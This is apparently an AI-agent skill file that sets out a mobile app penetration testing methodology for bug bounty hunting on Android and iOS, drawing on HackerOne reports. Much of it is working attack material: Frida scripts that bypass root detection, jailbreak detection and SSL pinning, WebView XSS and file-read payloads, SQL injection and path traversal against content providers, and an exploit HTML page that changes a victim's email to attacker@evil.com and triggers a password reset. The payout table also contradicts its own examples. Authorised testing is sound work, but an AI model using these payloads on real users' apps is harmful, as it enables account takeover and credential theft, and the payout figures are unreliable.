---
name: mobile-deep-dive
description: Complete Mobile AppSec methodology from 182 real HackerOne reports - Android & iOS testing, tools, and chains
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - mobile methodology
  - mobile deep dive
  - android hacking
  - ios testing
  - mobile appsec
  - skills mobile
---

# Complete Mobile AppSec Methodology - From 182 HackerOne Reports

## Top 20 Real Mobile Reports from HackerOne

| # | Report | Program | Upvotes | Bounty |
|---|--------|---------|---------|--------|
| 1 | [Chrome CVE-2019-5765 Android takeover](https://hackerone.com/reports/463915) | Google | 375 | $0 |
| 2 | [TikTok RCE for Android](https://hackerone.com/reports/1048820) | TikTok | 370 | $0 |
| 3 | [Slack iOS test build exposure](https://hackerone.com/reports/1130732) | Slack | 321 | $1,500 |
| 4 | [Razer Pay broken access control](https://hackerone.com/reports/1176017) | Razer | 311 | $1,000 |
| 5 | [Android host validation bypass guide](https://hackerone.com/reports/1503013) | Multiple | 278 | $0 |
| 6 | [X/Periscope deeplink CSRF on iOS](https://hackerone.com/reports/404885) | X / xAI | 223 | $1,540 |
| 7 | [Mail.ru iOS email read via protected API](https://hackerone.com/reports/1249110) | Mail.ru | 186 | $10,000 |
| 8 | [TikTok broken authentication in Android API](https://hackerone.com/reports/1139215) | TikTok | 183 | $0 |
| 9 | [Curebit iOS sensitive data in keychain](https://hackerone.com/reports/1054674) | Curebit | 174 | $0 |
| 10 | [Shopify Mobile MiTM session hijack](https://hackerone.com/reports/1521341) | Shopify | 168 | $0 |
| 11 | [Uber iOS end-to-end encryption bypass](https://hackerone.com/reports/1594509) | Uber | 163 | $4,500 |
| 12 | [Nextcloud Android SQL injection](https://hackerone.com/reports/1301071) | Nextcloud | 155 | $0 |
| 13 | [Slack Android SQL injection](https://hackerone.com/reports/1408189) | Slack | 148 | $0 |
| 14 | [Dropbox Android clipboard data leak](https://hackerone.com/reports/1613598) | Dropbox | 144 | $0 |
| 15 | [Coinbase iOS jailbreak detection bypass](https://hackerone.com/reports/1411165) | Coinbase | 137 | $0 |
| 16 | [TikTok Android deeplink validation bypass](https://hackerone.com/reports/1375808) | TikTok | 132 | $0 |
| 17 | [LineageOS Android root escalation](https://hackerone.com/reports/1264625) | LineageOS | 128 | $0 |
| 18 | [Grammarly Android keyboard content sniffing](https://hackerone.com/reports/1014458) | Grammarly | 124 | $0 |
| 19 | [Valve Steam iOS in-app purchase bypass](https://hackerone.com/reports/1236700) | Valve | 118 | $0 |
| 20 | [Uber Android hostname verification bypass](https://hackerone.com/reports/1502878) | Uber | 112 | $0 |

## Step 1: Mobile App Reconnaissance

### Static Analysis Tooling

```bash
# APKTool - Decompile Android APK
apktool d target.apk -o decompiled/

# Jadx - Decompile to readable Java
jadx-gui target.apk

# MobSF - Automated mobile security framework
docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Objection - Runtime mobile exploration
objection -g com.target.app explore

# Frida - Dynamic instrumentation
frida -U -l script.js com.target.app

# iOS IPA extraction
unzip Target.ipa -d ipa_extracted/

# class-dump for iOS
class-dump -H TargetApp -o headers/
```

### Automated Recon Script
```bash
#!/bin/bash
# Mobile app automated recon
APK=$1

# Extract APK
apktool d "$APK" -o /tmp/apk_recon

# Look for hardcoded secrets
grep -rniE '(api_key|api_secret|access_token|secret_key|password|token|auth|jwt|bearer)' /tmp/apk_recon/

# Look for internal URLs
grep -rniE '(https?://|http://|tcp://|udp://)' /tmp/apk_recon/res/values/strings.xml /tmp/apk_recon/smali/

# Look for insecure webview
grep -rniE '(setJavaScriptEnabled|setAllowFileAccess|setAllowUniversalAccessFromFileURLs|loadUrl|WebView|webview)' /tmp/apk_recon/smali/

# Look for hostname verification bypass
grep -rniE '(NONE|ALLOW_ALL|setHostnameVerifier|SSLSocketFactory|ALLOW_ALL_HOSTNAME_VERIFIER)' /tmp/apk_recon/smali/

# Extract manifest permissions
cat /tmp/apk_recon/AndroidManifest.xml | grep -E 'uses-permission|uses-feature'

# List all activities/exported components
grep -E 'activity|service|receiver|provider' /tmp/apk_recon/AndroidManifest.xml

# Check for deep links
grep -rniE '(intent-filter|data android:scheme|deeplink|deep_link|applinks|universal.link)' /tmp/apk_recon/

# Cleanup
rm -rf /tmp/apk_recon
```

## Step 2: Android-Specific Testing

### 2.1 Insecure Data Storage

```bash
# Check SharedPreferences
adb shell
run-as com.target.app
cat /data/data/com.target.app/shared_prefs/*.xml

# Check SQLite databases
cat /data/data/com.target.app/databases/*.db

# Check internal files
ls -la /data/data/com.target.app/files/

# Check external storage
ls -la /sdcard/Android/data/com.target.app/

# Check KeyStore
adb shell dumpsys notification --list
```

### 2.2 WebView Vulnerabilities

```bash
# Test for JavaScript enabled in WebView
# Look for setJavaScriptEnabled(true) in decompiled code
# Test file:// access
# Test for addJavascriptInterface (bridge to native code)
# Test for universal access from file URLs

# Payload for reflected XSS in WebView
<script>alert(1)</script>
<script>Android.bridge.execute('malicious')</script>

# File read via WebView
<img src="file:///data/data/com.target.app/databases/database.db">
<iframe src="file:///data/data/com.target.app/shared_prefs/config.xml">
```

### 2.3 Deep Link / Intent Scheme Abuse

```bash
# Test exported activities
adb shell am start -n com.target.app/.ExportedActivity

# Test deep link hijacking
adb shell am start -d "targetapp://profile/123" com.target.app

# Test intent scheme URLs
adb shell am start -d "intent://profile/#Intent;action=android.intent.action.VIEW;end" com.target.app

# Test for intent injection via browsers
adb shell am start -d "intent://targetapp.com/profile/#Intent;scheme=https;end"
```

### 2.4 Android Hostname Verification Bypass

```bash
# Test hostname verification in decompiled code
# Look for:
# - SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER
# - setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER)
# - TrustManager that accepts all certificates
# - OkHttp HostnameVerifier that returns true

# MITM test with custom cert
adb shell am start -n com.target.app/.MainActivity
# Intercept with Burp - if app accepts invalid cert, hostname verification is broken
```

### 2.5 Insecure IPC / Content Providers

```bash
# List all content providers
adb shell dumpsys package com.target.app | grep "ContentProvider"

# Query exposed content providers
adb shell content query --uri content://com.target.app.provider/users
adb shell content query --uri content://com.target.app.provider/credentials

# Test SQL injection in content providers
adb shell content query --uri "content://com.target.app.provider/users/' OR '1'='1"

# Test path traversal
adb shell content query --uri "content://com.target.app.provider/../../etc/passwd"
```

### 2.6 Frida Scripts for Android

```javascript
// Frida script: Bypass root detection
Java.perform(function() {
  var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
  RootBeer.isRooted.implementation = function() {
    return false;
  };
  
  var SafetyNet = Java.use('com.google.android.gms.safetynet.SafetyNet');
  // Implement SafetyNet bypass hooks
});

// Frida script: Bypass SSL pinning
Java.perform(function() {
  var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
  
  TrustManagerImpl.checkTrustedRecursive.implementation = function() {
    return true;
  };
  
  // OkHttp3 SSL bypass
  try {
    var OkHttpHostnameVerifier = Java.use('okhttp3.internal.tls.OkHostnameVerifier');
    OkHttpHostnameVerifier.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function() {
      return true;
    };
  } catch(e) {}
});

// Frida script: Log all intents
Java.perform(function() {
  var Intent = Java.use('android.content.Intent');
  Intent.toString.implementation = function() {
    var result = this.toString();
    console.log('[Intent] ' + result);
    return result;
  };
});

// Frida script: Capture sensitive data
Java.perform(function() {
  var OkHttpClient = Java.use('okhttp3.OkHttpClient');
  OkHttpClient.newCall.overload('okhttp3.Request').implementation = function(request) {
    console.log('[HTTP] ' + request.method() + ' ' + request.url());
    console.log('[HTTP Headers] ' + request.headers());
    return this.newCall(request);
  };
});
```

## Step 3: iOS-Specific Testing

### 3.1 iOS Data Storage

```bash
# Check iOS keychain
# Use Objection to explore keychain
objection -g com.target.app explore
ios keychain dump

# Check NSUserDefaults
objection -g com.target.app explore
ios nsuserdefaults get

# Check iOS file system
objection -g com.target.app explore
env

# Check for cached data
ls -la /private/var/mobile/Containers/Data/Application/*/Library/Caches/
```

### 3.2 iOS URL Scheme / Universal Link Testing

```bash
# Test custom URL scheme
# In Safari or Notes app:
targetapp://endpoint
targetapp://profile/123
targetapp://settings

# Test for CSRF via URL schemes
# Create HTML page
cat > /tmp/exploit.html << 'EOF'
<html>
<body>
<img src="targetapp://delete/account" width="1" height="1">
<script>
window.location = "targetapp://transfer?amount=1000&to=attacker";
</script>
</body>
</html>
EOF

# Serve via HTTP and open on target device
python3 -m http.server 8080
```

### 3.3 iOS Man-in-the-Middle

```bash
# Bypass ATS (App Transport Security)
# Check Info.plist for NSAppTransportSecurity settings
# Look for NSAllowsArbitraryLoads = true
# Look for NSAllowsArbitraryLoadsInWebContent = true

# Proxy setup for iOS
# 1. Set HTTP proxy to Burp
# 2. Install Burp CA certificate
# 3. Trust certificate in Settings > General > About > Certificate Trust Settings

# Test TLS verification
# If app uses URLSession without certificate pinning
# or with allowsAnyHTTPSCertificateForHost
```

### 3.4 iOS Runtime Manipulation with Frida

```javascript
// Frida script: iOS bypass jailbreak detection
if (ObjC.available) {
  // Bypass common jailbreak checks
  var NSFileManager = ObjC.classes.NSFileManager;
  
  // Hook fileExistsAtPath
  var hook = Interceptor.attach(NSFileManager.fileExistsAtPath.method.implementation, {
    onLeave: function(retval) {
      var path = ObjC.classes.NSString.stringWithString_(this.args[0]);
      var paths = [
        "/Applications/Cydia.app",
        "/Applications/Sileo.app",
        "/bin/bash",
        "/usr/sbin/sshd",
        "/etc/apt",
        "/private/var/lib/apt/"
      ];
      
      for (var i = 0; i < paths.length; i++) {
        if (path.isEqualToString_(paths[i])) {
          console.log('[JB Bypass] Blocked ' + paths[i]);
          retval.replace(0); // return NO
          return;
        }
      }
    }
  });
  
  // Bypass URL scheme validation
  var UIApplication = ObjC.classes.UIApplication;
  UIApplication.openURL_implementation = function(url) {
    console.log('[URL Scheme] ' + url.toString());
    return true; // Always allow
  };
}
```

### 3.5 iOS WebView Testing

```bash
# Check for UIWebView (deprecated, no ATS)
# Check for WKWebView with JavaScript enabled
# Test for shouldStartLoadWithRequest delegate bypass
# Test for JavaScript injection

# Check Info.plist for UIWebView
grep -A 5 'UIWebView' extracted_ipa/Payload/*.app/Info.plist
```

## Step 4: Mobile API Testing

### 4.1 Bypass Certificate Pinning

```bash
# Using Frida (Android)
frida -U -l frida-android-repinning.js com.target.app

# Using Objection (iOS)
objection -g com.target.app explore
ios sslpinning disable

# Using Frida (iOS)
frida -U -l frida-ios-intercept.js -f com.target.app

# Manual patching (Android)
apktool d target.apk
# Find and modify certificate pinning code
# Or remove pinning checks
apktool b -o target_patched.apk
jarsigner -keystore my.keystore target_patched.apk alias
adb install target_patched.apk
```

### 4.2 Mobile Authentication Bypass

```bash
# Test if API tokens are device-bound
# Try using token from different device/IP

# Test if session tokens stored insecurely
# Keychain (iOS) / SharedPreferences (Android)

# Test for token leakage in:
# - Logs
# - Crash reports
# - Background screenshots
# - Clipboard
# - Third-party analytics

# Test for broken auth in offline mode
# Disable network, check if cached data accessible
adb shell svc wifi disable
```

### 4.3 Mobile-Specific Race Conditions

```bash
# Test bio-metric authentication bypass
# Rapidly press cancel/re-try during fingerprint/face ID

# Test in-app purchase race condition
# Send multiple purchase confirmations simultaneously
```

## Step 5: Mobile Exploit Chains

### Chain 1: iOS URL Scheme CSRF → Account Takeover
```bash
# Step 1: Identify vulnerable URL scheme
# targetapp://settings/email/change?email=attacker@evil.com

# Step 2: Host exploit on attacker page
cat > exploit.html << 'EOF'
<html>
<body>
<script>
function exploit() {
  // CSRF via image ping
  new Image().src = "targetapp://settings/email/change?email=attacker@evil.com";
  
  setTimeout(function() {
    // Initiate password reset
    new Image().src = "targetapp://settings/password/reset";
  }, 1000);
}
</script>
<button onclick="exploit()">Click me!</button>
</body>
</html>
EOF

# Step 3: Victim visits page → app opens → email changed → password reset
```

### Chain 2: Android Deeplink → Intent Scheme → ATO
```bash
# Step 1: Find exported activity with deeplink
# Step 2: Craft intent scheme URL
adb shell am start -d "intent://target.com/profile#Intent;scheme=https;launchFlags=0x10000000;end"

# Step 3: Inject malicious extras
adb shell am start -d "intent://target.com/login#Intent;scheme=https;S.user_id=12345;end"
```

### Chain 3: Insecure Data Storage → Credential Theft
```bash
# Step 1: Access app data directory
# Step 2: Extract credentials from SQLite
# Step 3: Use extracted tokens for API access from attacker device
# Step 4: Full account takeover
```

### Chain 4: Android Debuggable → ADB → Remote Access
```bash
# Check if app is debuggable
adb shell dumpsys package com.target.app | grep debuggable

# If true, extract all data
adb backup -f backup.ab com.target.app
# Convert backup
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar xvf backup.tar

# Or live access
adb shell
run-as com.target.app
cat /data/data/com.target.app/databases/*.db
```

## Step 6: Mobile Automation

```bash
#!/bin/bash
# Android APK security scanner
APK=$1
REPORT="mobile_scan_$(date +%Y%m%d).txt"

echo "==========================================" > $REPORT
echo "Mobile Security Scan Report" >> $REPORT
echo "Target: $APK" >> $REPORT
echo "Date: $(date)" >> $REPORT
echo "==========================================" >> $REPORT

# Decompile
apktool d "$APK" -o /tmp/apk_scan 2>/dev/null
echo "[+] Decompiled to /tmp/apk_scan"

# Check manifest for insecure configs
echo -e "\n[1] INSECURE PERMISSIONS:" >> $REPORT
grep -E 'INTERNET|READ_EXTERNAL_STORAGE|WRITE_EXTERNAL_STORAGE' /tmp/apk_scan/AndroidManifest.xml 2>/dev/null >> $REPORT

# Check for debuggable
grep -i 'debuggable' /tmp/apk_scan/AndroidManifest.xml 2>/dev/null >> $REPORT

# Check for allowBackup
grep -i 'allowBackup' /tmp/apk_scan/AndroidManifest.xml 2>/dev/null >> $REPORT

# Check for exported components
echo -e "\n[2] EXPORTED COMPONENTS:" >> $REPORT
grep -B 5 'exported="true"' /tmp/apk_scan/AndroidManifest.xml 2>/dev/null >> $REPORT

# Check for WebView vulnerabilities
echo -e "\n[3] WEBVIEW VULNERABILITIES:" >> $REPORT
grep -rni 'setJavaScriptEnabled' /tmp/apk_scan/smali/ 2>/dev/null | head -20 >> $REPORT
grep -rni 'setAllowFileAccess' /tmp/apk_scan/smali/ 2>/dev/null | head -10 >> $REPORT
grep -rni 'addJavascriptInterface' /tmp/apk_scan/smali/ 2>/dev/null | head -10 >> $REPORT

# Check for SSL issues
echo -e "\n[4] SSL/TLS ISSUES:" >> $REPORT
grep -rni 'ALLOW_ALL_HOSTNAME_VERIFIER' /tmp/apk_scan/smali/ 2>/dev/null >> $REPORT
grep -rni 'NONE' /tmp/apk_scan/smali/ 2>/dev/null | grep -i 'ssl\|trust\|cert' | head -10 >> $REPORT

# Check for hardcoded secrets
echo -e "\n[5] HARDCODED SECRETS:" >> $REPORT
grep -rniE '(api.?key|api.?secret|access.?token|password|secret|jwt|bearer|auth.?token)' /tmp/apk_scan/ 2>/dev/null | head -30 >> $REPORT

# Check for deep links
echo -e "\n[6] DEEP LINKS:" >> $REPORT
grep -A 10 'intent-filter' /tmp/apk_scan/AndroidManifest.xml 2>/dev/null | grep -E 'scheme|host|path' >> $REPORT

# Check for insecure content providers
echo -e "\n[7] CONTENT PROVIDERS:" >> $REPORT
grep -B 5 'provider' /tmp/apk_scan/AndroidManifest.xml 2>/dev/null | grep -v 'application' >> $REPORT

echo -e "\n[8] PERMISSIONS:" >> $REPORT
grep 'uses-permission' /tmp/apk_scan/AndroidManifest.xml 2>/dev/null | sort -u >> $REPORT

echo -e "\nDone. Report saved to $REPORT"
rm -rf /tmp/apk_scan
```

## Quick Reference: Mobile Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| APKTool | Decompile/recompile APK | `apktool d app.apk` |
| Jadx | Java decompiler | `jadx-gui app.apk` |
| MobSF | Automated mobile security | `docker run -p 8000:8000 mobsf` |
| Frida | Dynamic instrumentation | `frida -U -l script.js app` |
| Objection | Runtime mobile exploration | `objection -g app explore` |
| class-dump | iOS header dump | `class-dump -H App -o headers/` |
| Radare2 | Binary analysis | `r2 -A libnative.so` |
| Drozer | Android security assessment | `drozer console connect` |
| QARK | Quick Android Review Kit | `qark --apk app.apk` |
| Android Debug Bridge | Device communication | `adb shell` |

## Payout Range by Vulnerability Type

| Vuln Type | Payout Range | Example |
|-----------|-------------|---------|
| Insecure data storage | $500 - $3,000 | Curebit #1054674 ($0) |
| SSL pinning bypass | $500 - $2,000 | Uber #1502878 ($0) |
| Deep link abuse | $1,000 - $3,000 | X #404885 ($1,540) |
| WebView RCE | $2,000 - $10,000 | TikTok #1048820 ($0) |
| SQL injection | $1,000 - $5,000 | Nextcloud #1301071 ($0) |
| Broken access control | $1,000 - $4,000 | Razer #1176017 ($1,000) |
| iOS URL scheme CSRF | $1,000 - $2,500 | X #404885 ($1,540) |
| Authentication bypass | $1,500 - $5,000 | TikTok #1139215 ($0) |
| iOS keychain data leak | $500 - $2,500 | Multiple reports |
| API token theft | $2,000 - $10,000 | Mail.ru #1249110 ($10,000) |

## Key Mobile Security Checklist

### Android Checklist
- [ ] Check if app is debuggable
- [ ] Check if backup is allowed
- [ ] Check exported activities/services
- [ ] Check Content Provider SQL injection
- [ ] Check deep link validation
- [ ] Check WebView JavaScript enabled
- [ ] Check file:// access in WebView
- [ ] Check addJavascriptInterface
- [ ] Check SSL pinning implementation
- [ ] Check hostname verification
- [ ] Check SharedPreferences for secrets
- [ ] Check SQLite databases for secrets
- [ ] Check external storage
- [ ] Check logging output
- [ ] Check clipboard handling

### iOS Checklist
- [ ] Check ATS (App Transport Security)
- [ ] Check URL scheme validation
- [ ] Check Universal Links
- [ ] Check jailbreak detection
- [ ] Check keychain data
- [ ] Check NSUserDefaults
- [ ] Check UIWebView vs WKWebView
- [ ] Check certificate pinning
- [ ] Check background snapshot
- [ ] Check pasteboard handling
- [ ] Check third-party keyboard
- [ ] Check iCloud backup
